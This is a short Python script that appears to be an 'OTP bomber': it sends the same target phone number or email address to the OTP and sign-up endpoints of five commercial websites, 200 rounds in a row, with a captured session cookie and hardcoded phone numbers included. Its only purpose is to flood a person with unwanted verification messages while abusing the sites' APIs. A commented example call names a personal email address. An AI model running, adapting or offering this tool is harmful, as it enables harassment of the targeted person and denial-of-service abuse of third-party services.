import requests
import json
import time

def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        {
            "method": "POST",
            "url": "https://onlinemf.bajajcapital.com/login.aspx/SendOTP",
            "headers": {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "content-type": "application/json; charset=UTF-8",
                "origin": "https://onlinemf.bajajcapital.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://onlinemf.bajajcapital.com/login.aspx",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "cookie": (
                    "ASP.NET_SessionId=webkxrq0hdr25nglhwcgqdaa; "
                    "_ga_KGF5MKL65J=GS1.1.1702923376.1.0.1702923376.60.0.0; "
                    "_gid=GA1.2.548600528.1702923377; "
                    "_gat_gtag_UA_45018221_9=1; "
                    "_gat_gtag_UA_45018221_12=1; "
                    "_gcl_au=1.1.1349918880.1702923377; "
                    "_gat_UA-121051705-1=1; "
                    "_gat_UA-45018221-12=1; "
                    "G_ENABLED_IDPS=google; "
                    "_ga_L88B2YLDK3=GS1.1.1702923378.1.0.1702923378.60.0.0; "
                    "_ga=GA1.2.228214259.1702923376; "
                    "_ga_HF1B7GY004=GS1.2.1702923378.1.1.1702923379.59.0.0; "
                    "_ga_X4M7KPF74R=GS1.1.1702923376.1.1.1702923391.0.0.0"
                )
            },
            "data": {
                "value": "7460092221",
                "SendTo": number,
                "form": "signup"
            }
        },
        {
            "method": "POST",
            "url": "https://m.cricbuzz.com/api/cbplus/auth/user/sign-up",
            "headers": {
                "Content-Type": "application/json"
            },
            "data": {
                "username": number
            }
        },
        {
            "method": "POST",
            "url": "https://apis.bakingo.com/api/bakingo/fa/users/sendOtp",
            "headers": {
                "Content-Type": "application/json"
            },
            "data": {
                "user_mobile": "9936363250",
                "user_email": number,
                "resend_otp": 0,
                "bk-source": "app"
            }
        },
        
        {
            "method": "POST",
            "url": "https://base.amberstudent.com/api/v0/users/generate_email_otp",
            "headers": {
                "Content-Type": "application/json"
            },
            "data": {
                "user": {
                    "email": number
                }
            }
        },
        {
            "method": "GET",
            "url": "https://h5api.kameymall.com/sso2/getMailAuthCode2",
            "params": {
                "mail": number,
                "count": 6
            },
            "headers": {
                "Content-Type": "application/json"
            }
        },
    ]
    
    # Run the requests for 500 times
    for _ in range(200):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        time.sleep(1)

# Example usage:
#smsgii("shivamrajput662006@gmail.com")  # Replace "9" with the phone number you want to use
